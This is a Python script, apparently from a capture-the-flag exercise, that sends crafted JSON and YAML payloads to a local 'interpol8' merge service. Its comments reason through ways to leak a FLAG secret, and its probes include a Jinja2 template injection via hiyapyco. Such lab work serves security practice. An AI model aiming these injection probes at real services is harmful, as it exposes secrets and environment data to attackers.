#!/usr/bin/env python3
import requests
import json

URL = "http://localhost:6969/interpol8"

# New idea: make json_handler.dumps be a callable class/object
# Actually, we can't create objects in JSON, only primitives and structures

# But wait - what if we leverage how Python's attribute access works?
# If I set json_handler to a dict with a "dumps" key,
# then json_handler.dumps accesses that value

# What if that value is itself something that when "called", gives us info?

# Actually, let me test something simpler first:
# Can we make the FLAG appear in the __dict__ itself?

print("=== Test: Can we inject FLAG as a key? ===")
payload = {
    "doc1": '{"FLAG": "leaked_somehow"}',
    "doc2": '{"test": "data"}',
    "type1": "json",
    "type2": "json",
    "return_type": "json"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text[:500]}\n")

# OK so if that works, the question is: can we make the VALUE be os.environ['FLAG']?
# No, because we're limited to JSON types

# What if we abuse the YAML interpolation features?
# hiyapyco supports Jinja2 templating!

print("=== Test: YAML with Jinja2 ===")
yaml_with_template = """
flag: "{{ FLAG }}"
"""

payload = {
    "doc1": yaml_with_template,
    "doc2": '{"test": "data"}',
    "type1": "yaml",
    "type2": "json",
    "return_type": "json"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text[:500]}\n")

# Or maybe access environment variables?
yaml_with_env = """
flag: "ENV_VAR_HERE"
"""

payload = {
    "doc1": yaml_with_env,
    "doc2": '{"test": "data"}',
    "type1": "yaml",
    "type2": "json",
    "return_type": "json"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text[:500]}\n")
